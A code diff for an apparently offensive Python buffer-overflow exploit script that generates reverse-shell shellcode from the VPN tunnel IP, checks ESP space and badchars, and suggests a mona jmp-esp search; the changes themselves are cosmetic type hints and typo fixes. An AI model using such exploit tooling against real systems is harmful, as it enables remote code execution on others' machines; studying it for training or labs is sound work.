@@ -2,7 +2,6 @@ import binascii
 import os
 import socket
 import struct
-import subprocess
 import time
 
 from typing import Union
@@ -183,7 +182,7 @@ def badchars_not_esp(offset: int) -> str:
     return "".join(current_badchars)
 
 
-def shell_gen(badchars: str):
+def shell_gen(badchars: str) -> None:
     """Generates the shellcode using the vpn tunnel ip address"""
     execute(f"ip addr show {interface} | grep 'inet ' | " + "awk '{print $2}' | cut -d'/' -f1 > /tmp/ip")
     ip = open("/tmp/ip", "r").read().strip()
@@ -194,7 +193,7 @@ def shell_gen(badchars: str):
     print("[+] Generated shellcode at /tmp/shellcode")
 
 
-def exploit(offset: int, badchars: str):
+def exploit(offset: int, badchars: str) -> None:
     global eip_str
 
     print(f"[!] Pro tip: !mona jmp -r esp -cpb \"{badchars}\"")
@@ -227,7 +226,7 @@ def exploit(offset: int, badchars: str):
 
 
 def check_esp(offset: int) -> None:
-    """function check if esp has enough room for shelllcode"""
+    """function check if esp has enough room for shellcode"""
     padding = "A" * offset
     eip = "B" * 4
     esp = "C" * 500
@@ -259,7 +258,7 @@ def main() -> None:
         badchars = badchars_not_esp(offset)
 
     shell_gen(badchars)
-    exploit(offset,badchars)
+    exploit(offset, badchars)
 
     print("\n[+] Exploit Info")
     print(f"[+] Address: {ip}:{port}")
